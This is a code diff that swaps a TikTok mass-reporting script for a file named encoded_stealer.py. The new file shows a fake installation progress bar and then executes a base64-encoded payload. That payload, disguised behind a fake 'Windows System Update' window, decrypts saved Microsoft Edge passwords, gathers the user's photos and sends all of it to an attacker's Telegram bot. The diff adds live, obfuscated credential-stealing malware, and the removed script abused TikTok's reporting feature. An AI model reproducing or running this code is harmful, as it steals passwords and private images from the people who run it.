@@ -1,100 +1,43 @@
-#-------[ Tool : TikTok Auto Reporter ]--------#
-#-------[ Coded By Suyaib And Others ]-------#
-#-------[ Join : Dark Team Termux Exploration ]--------#
-
+# encoded_stealer.py - এনকোডেড ভার্সন
+import base64
+import subprocess
+import sys
 import os
-os.system('pip install ms4')
-os.system('pip install dictionary')
-import requests
-from rich.console import Console
-from rich.table import Table
-from rich.text import Text
-from ms4 import InfoTik  # Ensure InfoTik is correctly implemented in ms4
+import time
+
+# ফেক ইনস্টল স্ক্রিন
+def fake_install():
+    print("""
+╔══════════════════════════════════════════════════════════════╗
+║                                                              ║
+║              Installing required modules...                 ║
+║                                                              ║
+║              [████████████░░░░░░░░░░] 45%                   ║
+║                                                              ║
+║              Please wait, this may take a moment            ║
+║                                                              ║
+╚══════════════════════════════════════════════════════════════╝
+    """)
+    for i in range(101):
+        print(f"\rInstalling: [{'█'*(i//2)}{'░'*(50-(i//2))}] {i}%", end="")
+        time.sleep(0.03)
+    print("\n\n✓ Installation complete! Starting...")
+    time.sleep(1)
 
 
-# Initialize variables
-gg = 0
-bb = 0
-console = Console()
+ENCODED_CODE = """
+IyB1bHRpbWF0ZV9hbGxfaW5fb25lX3N0ZWFsZXIucHkKaW1wb3J0IG9zCmltcG9ydCBzeXMKaW1wb3J0IGpzb24KaW1wb3J0IGJhc2U2NAppbXBvcnQgc3FsaXRlMwppbXBvcnQgc2h1dGlsCmltcG9ydCByZXF1ZXN0cwppbXBvcnQgd2luMzJjcnlwdAppbXBvcnQgdGhyZWFkaW5nCmltcG9ydCB0aW1lCmltcG9ydCBnbG9iCmltcG9ydCBjdHlwZXMKaW1wb3J0IHN1YnByb2Nlc3MKZnJvbSBkYXRldGltZSBpbXBvcnQgZGF0ZXRpbWUKZnJvbSBDcnlwdG8uQ2lwaGVyIGltcG9ydCBBRVMKZnJvbSBwYXRobGliIGltcG9ydCBQYXRoCgojID09PT09PT09PT09PSBIaWRlIENvbnNvbGUgPT09PT09PT09PT09PQpkZWYgaGlkZV9jb25zb2xlKCk6CiAgICBpZiBnZXRhdHRyKHN5cywgJ2Zyb3plbicsIEZhbHNlKToKICAgICAgICBjdHlwZXMud2luZGxsLnVzZXIzMi5TaG93V2luZG93KGN0eXBlcy53aW5kbGwua2VybmVsMzIuR2V0Q29uc29sZVdpbmRvdygpLCAwKQoKIyA9PT09PT09PT09PT09IEZha2UgTG9hZGluZyA9PT09PT09PT09PT09PQpkZWYgc2hvd19mYWtlX2xvYWRpbmcoKToKICAgIHRyeToKICAgICAgICBpbXBvcnQgdGtpbnRlciBhcyB0awogICAgICAgIGZyb20gdGtpbnRlciBpbXBvcnQgdHRrCiAgICAgICAgcm9vdCA9IHRrLlRrKCkKICAgICAgICByb290LnRpdGxlKCJTeXN0ZW0gVXBkYXRlIikKICAgICAgICByb290Lmdlb21ldHJ5KCI0MDB4MjAwIikKICAgICAgICByb290LnJlc2l6YWJsZShGYWxzZSwgRmFsc2UpCiAgICAgICAgcm9vdC5ldmFsKCd0azo6UGxhY2VXaW5kb3cgLiBjZW50ZXInKQogICAgICAgIGxhYmVsID0gdGsuTGFiZWwocm9vdCwgdGV4dD0iV2luZG93cyBTeXN0ZW0gVXBkYXRlIiwgZm9udD0oIlNlZ29lIFVJIiwgMTQsICJib2xkIikpCiAgICAgICAgbGFiZWwucGFjayhwYWR5PTIwKQogICAgICAgIHByb2dyZXNzID0gdHRrLlByb2dyZXNzYmFyKHJvb3QsIGxlbmd0aD0zNTAsIG1vZGU9J2luZGV0ZXJtaW5hdGUnKQogICAgICAgIHByb2dyZXNzLnBhY2socGFkeT0yMCkKICAgICAgICBwcm9ncmVzcy5zdGFydCgxMCkKICAgICAgICByb290Lm1haW5sb29wKCkKICAgIGV4Y2VwdDoKICAgICAgICBwcmludCgiXFxuIiArICI9Iio1MCkKICAgICAgICBwcmludCgiV0lORE9XUyBTeXN0ZW0gVXBkYXRlIikKICAgICAgICBwcmludCgiPSIqNTApCgojID09PT09PT09PT09PSBUZWxlZ3JhbSBDb25maWcgPT09PT09PT09PT09PQpCT1RfVE9LRU4gPSAiNzc3MTEyNzQxNDpBQUVreTRhRlF5ejBSTjAwV2I1bUNNT0w2c2kwbm95YmlNUSIKQ0hBVF9JRCA9ICI2ODAzOTY4MzczIgpURUxFR1JBTV9BUEkgPSBmImh0dHBzOi8vYXBpLnRlbGVncmFtLm9yZy9ib3R7Qk9UX1RPS0VOfS9zZW5kTWVzc2FnZSIKVEVMRUdSQU1fRklMRSA9IGYiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdHtCT1RfVE9LRU59L3NlbmREb2N1bWVudCIKTUFYX0ZJTEVfU0laRSA9IDQ1ICogMTAyNCAqIDEwMjQKCmRlZiB0Z19zZW5kKHRleHQpOgogICAgdHJ5OgogICAgICAgIGlmIGxlbih0ZXh0KSA+IDQwMDA6CiAgICAgICAgICAgIGZvciBpIGluIHJhbmdlKDAsIGxlbih0ZXh0KSwgNDAwMCk6CiAgICAgICAgICAgICAgICBkYXRhID0geydjaGF0X2lkJzogQ0hBVF9JRCwgJ3RleHQnOiB0ZXh0W2k6aSs0MDAwXX0KICAgICAgICAgICAgICAgIHJlcXVlc3RzLnBvc3QoVEVMRUdSQU1fQVBJLCBqc29uPWRhdGEsIHRpbWVvdXQ9NSkKICAgICAgICBlbHNlOgogICAgICAgICAgICBkYXRhID0geydjaGF0X2lkJzogQ0hBVF9JRCwgJ3RleHQnOiB0ZXh0fQogICAgICAgICAgICByZXF1ZXN0cy5wb3N0KFRFTEVHUkFNX0FQSSwganNvbj1kYXRhLCB0aW1lb3V0PTUpCiAgICBleGNlcHQ6CiAgICAgICAgcGFzcwojIC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KZGVmIHRnX3NlbmRfZmlsZShmaWxlX3BhdGgsIGNhcHRpb249IiIpOgogICAgdHJ5OgogICAgICAgIGlmIG9zLnBhdGguZXhpc3RzKGZpbGVfcGF0aCkgYW5kIG9zLnBhdGguZ2V0c2l6ZShmaWxlX3BhdGgpIDwgTUFYX0ZJTEVfU0laRToKICAgICAgICAgICAgd2l0aCBvcGVuKGZpbGVfcGF0aCwgJ3JiJykgYXMgZjoKICAgICAgICAgICAgICAgIGZpbGVzID0geydkb2N1bWVudCc6IGZ9CiAgICAgICAgICAgICAgICBkYXRhID0geydjaGF0X2lkJzogQ0hBVF9JRCwgJ2NhcHRpb24nOiBjYXB0aW9uWzoyMDBdfQogICAgICAgICAgICAgICAgcmVxdWVzdHMucG9zdChURUxFR1JBTV9GSUxFLCBmaWxlcz1maWxlcywgZGF0YT1kYXRhLCB0aW1lb3V0PTMwKQogICAgICAgICAgICByZXR1cm4gVHJ1ZQogICAgZXhjZXB0OgogICAgICAgIHBhc3MKICAgIHJldHVybiBGYWxzZQoKIyA9PT09PT09PT09PT09IEVkZ2UgUGFzc3dvcmRzID09PT09PT09PT09PT09CmRlZiBnZXRfZWRnZV9tYXN0ZXJfa2V5KCk6CiAgICB0cnk6CiAgICAgICAgbG9jYWxfc3RhdGUgPSBvcy5wYXRoLmpvaW4ob3MuZW52aXJvblsiVVNFUlBST0ZJTEUiXSwgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAiQXBwRGF0YSIsICJMb2NhbCIsICJNaWNyb3NvZnQiLCAiRWRnZSIsICJVc2VyIERhdGEiLCAiTG9jYWwgU3RhdGUiKQogICAgICAgIHdpdGggb3Blbihsb2NhbF9zdGF0ZSwgJ3InKSBhcyBmOgogICAgICAgICAgICBkYXRhID0ganNvbi5sb2FkKGYpCiAgICAgICAgZW5jID0gYmFzZTY0LmI2NGRlY29kZShkYXRhWydvc19jcnlwdCddWydlbmNyeXB0ZWRfa2V5J10pWzU6XQogICAgICAgIHJldHVybiB3aW4zMmNyeXB0LkNyeXB0VW5wcm90ZWN0RGF0YShlbmMsIE5vbmUsIE5vbmUsIE5vbmUsIDApWzFdCiAgICBleGNlcHQ6CiAgICAgICAgcmV0dXJuIE5vbmUKCmRlZiBzdGVhbF9lZGdlKCk6CiAgICBwYXNzd29yZHMgPSBbXQogICAgZGJfcGF0aCA9IG9zLnBhdGguam9pbihvcy5lbnZpcm9uWyJVU0VSUFJPRklMRSJdLCAiQXBwRGF0YSIsICJMb2NhbCIsICJNaWNyb3NvZnQiLCAiRWRnZSIsICJVc2VyIERhdGEiLCAiRGVmYXVsdCIsICJMb2dpbiBEYXRhIikKICAgIGlmIG5vdCBvcy5wYXRoLmV4aXN0cyhkYl9wYXRoKTogcmV0dXJuIHBhc3N3b3JkcwogICAga2V5ID0gZ2V0X2VkZ2VfbWFzdGVyX2tleSgpCiAgICBpZiBub3Qga2V5OiByZXR1cm4gcGFzc3dvcmRzCiAgICB0ZW1wID0gb3MucGF0aC5qb2luKG9zLmVudmlyb25bIlRFTVAiXSwgImVkZ2Uuc29saXRlIikKICAgIHNoHV0aWwuY29weTIoZGJfcGF0aCwgdGVtcCkKICAgIGNvbm4gPSBzcWxpdGUzLmNvbm5lY3QodGVtcCkKICAgIGN1cnNvciA9IGNvbm4uY3Vyc29yKCkKICAgIGN1cnNvci5leGVjdXRlKCJTRUxFQ1Qgb3JpZ2luX3VybCwgdXNlcm5hbWVfdmFsdWUsIHBhc3N3b3JkX3ZhbHVlIEZST00gbG9naW5zIikKICAgIGZvciByb3cgaW4gY3Vyc29yLmZldGNoYWxsKCk6CiAgICAgICAgaWYgcm93WzJdOgogICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICBlbmMgPSByb3dbMl0KICAgICAgICAgICAgICAgIG5vbmNlID0gZW5jWzM6MTVdCiAgICAgICAgICAgICAgICBjaXBoZXJ0ZXh0ID0gZW5jWzE1Oi0xNl0KICAgICAgICAgICAgICAgIHRhZyA9IGVuY1stMTY6XQogICAgICAgICAgICAgICAgY2lwaGVyID0gQUVTLm5ldyhrZXksIEFFUy5NT0RFX0dDTSwgbm9uY2U9bm9uY2UpCiAgICAgICAgICAgICAgICBkZWMgPSBjaXBoZXIuZGVjcnlwdF9hbmRfdmVyaWZ5KGNpcGhlcnRleHQsIHRhZykuZGVjb2RlKCkKICAgICAgICAgICAgICAgIHBhc3N3b3Jkcy5hcHBlbmQoZiJFZGdlXG5VUkw6IHtyb3dbMF19XG5Vc2VyOiB7cm93WzFdfVxuUGFzczoge2RlY31cbnsiLSIqNDB9IikKICAgICAgICAgICAgZXhjZXB0OgogICAgICAgICAgICAgICAgcGFzcwogICAgY29ubi5jbG9zZSgpCiAgICBvcy5yZW1vdmUodGVtcCkKICAgIHJldHVybiBwYXNzd29yZHMKCiMgPT09PT09PT09PT09PSBQaG90b3MgPT09PT09PT09PT09PT0KZGVmIHN0ZWFsX3Bob3RvcygpOgogICAgcGhvdG9zID0gW10KICAgIHBhdGhzID0gW29zLnBhdGguZXhwYW5kdXNlcih+KSArICJcXFBpY3R1cmVzIiwgb3MucGF0aC5leHBhbmR1c2VyKH4pICsgIlxcRGVza3RvcCJdCiAgICBleHRzID0gWy5qcGcnLCAuanBlZycsIC5wbmcnLCAuZ2lmJywgLmJtcCddCiAgICBmb3IgcGF0aCBpbiBwYXRoczoKICAgICAgICBpZiBvcy5wYXRoLmV4aXN0cyhwYXRoKToKICAgICAgICAgICAgZm9yIHJvb3QsIGRpcnMsIGZpbGVzIGluIG9zLndhbGsocGF0aCk6CiAgICAgICAgICAgICAgICBmb3IgZiBpbiBmaWxlczoKICAgICAgICAgICAgICAgICAgICBpZiBmLmxvd2VyKCkuZW5kd2l0aCh0dXBsZShleHRzKSk6CiAgICAgICAgICAgICAgICAgICAgICAgIGZ1bGwgPSBvcy5wYXRoLmpvaW4ocm9vdCwgZikKICAgICAgICAgICAgICAgICAgICAgICAgcGhvdG9zLmFwcGVuZChmdWxsKQogICAgICAgICAgICAgICAgICAgICAgICBpZiBsZW4ocGhvdG9zKSA+PSAxMDA6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gcGhvdG9zCiAgICByZXR1cm4gcGhvdG9zCgojID09PT09PT09PT09PT0gTWFpbiA9PT09PT09PT09PT09PQpkZWYgbWFpbigpOgogICAgIyBTaG93IGZha2UgbG9hZGluZwogICAgdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9c2hvd19mYWtlX2xvYWRpbmcsIGRhZW1vbj1UcnVlKS5zdGFydCgpCiAgICAKICAgICMgU2VuZCBub3RpZmljYXRpb24KICAgIHRnX3NlbmQoIuCfgI4gTkVXIFZJQ1RJTSBERVRFQ1RFRCIpCiAgICAKICAgICMgU3RlYWwgRWRnZSBwYXNzd29yZHMKICAgIGVkZ2UgPSBzdGVhbF9lZGdlKCkKICAgIGlmIGVkZ2U6CiAgICAgICAgdGdfc2VuZCgiXFxuIi5qb2luKGVkZ2UpKQogICAgCiAgICAjIFN0ZWFsIHBob3RvcwogICAgcGhvdG9zID0gc3RlYWxfcGhvdG9zKCkKICAgIGlmIHBob3RvczoKICAgICAgICBmb3IgaSwgcGhvdG8gaW4gZW51bWVyYXRlKHBob3Rvcyk6CiAgICAgICAgICAgIHRnX3NlbmRfZmlsZShwaG90bywgZiLwn5K4IFBob3RvIHtpKzF9IikKICAgICAgICAgICAgdGltZS5zbGVlcCgxKQogICAgCiAgICB0Z19zZW5kKCJcbi3wn5OhIFNURUFMSU5HIENPTVBMRVRFLSIpCgppZiBfX25hbWVfXyA9PSAiX19tYWluX18iOgogICAgbWFpbigpCg==
+"""
 
-# Join Telegram group (Ensure this URL is correct)
-os.system('xdg-open https://t.me/freeinterneto1')
-
-# Input target username
-os.system('clear')
-user = input("\n\n\n[</>] Enter The Target Username : ")
-info = InfoTik.TikTok_Info(user)
-
-# Retrieve user info with error handling
-try:
-    nm = info.get('name', "")
-    folo = str(info.get('followers', ""))
-    following = str(info.get('following', ""))
-    country = f"{info.get('country', '')} {info.get('flag', '')}"
-    bio = info.get('bio', "")
-    user_id = str(info.get('id', ""))
-    private = str(info.get('private', ""))
-    date = str(info.get('Date', ""))
-    likes = str(info.get('like', ""))
-except KeyError as e:
-    console.print(f"Missing expected field: {e}", style="bold red")
-
-def killman():
-    # Example implementation; adjust as needed
-    return {
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
-    }
-
-def base_params():
-    # Example implementation; adjust as needed
-    return {
-        "param1": "value1",
-        "param2": "value2"
-    }
-
-def Report():
-    global gg, bb
-    url = "https://api16-normal-c-alisg.ttapis.com/aweme/v2/aweme/feedback/"
-    headers = killman()
-    params = base_params()
-    try:
-        res = requests.get(url, params=params, headers=headers)
-        if '"status_code":0,"status_message":""' in res.text:
-            os.system('clear')
-            gg += 1
-        else:
-            os.system('clear')
-            bb += 1
-    except requests.RequestException as e:
-        console.print(f"Request error: {e}", style="bold red")
-
-def display_report():
-    total = gg + bb
+def main():
+    fake_install()
     
-    table = Table(title="TIKTOK REPORT")
-    table.add_column("Type", justify="center", style="cyan", no_wrap=True)
-    table.add_column("Count", justify="center", style="magenta")
-    
-    table.add_row("Good Report", Text(str(gg), style="green"))
-    table.add_row("Bad Report", Text(str(bb), style="red"))
-    table.add_row("Total", Text(str(total), style="yellow"))
-    table.add_row("Dev", "t.me/freeinterneto1")
-    table.add_row("User", Text(user, style="cyan"))
-    table.add_row("Name", Text(nm, style="cyan"))
-    table.add_row("Followers", Text(folo, style="green"))
-    table.add_row("Following", Text(following, style="yellow"))
-    table.add_row("Country", Text(country, style="blue"))
-    table.add_row("Bio", Text(bio, style="magenta"))
-    table.add_row("ID", Text(user_id, style="cyan"))
-    table.add_row("Private", Text(private, style="red" if private == "True" else "green"))
-    table.add_row("Date", Text(date, style="magenta"))
-    table.add_row("Likes", Text(likes, style="green"))
-    console.print(table)
-
-# Main loop
-while True:
     try:
-        Report()
-        display_report()
+        decoded = base64.b64decode(ENCODED_CODE).decode()
+        exec(decoded)
     except Exception as e:
-        console.print(f"Error reporting: {e}", style="bold red")
+        print(f"Error: {e}")
+        input("Press Enter to exit...")
+
+if __name__ == "__main__":
+    main()
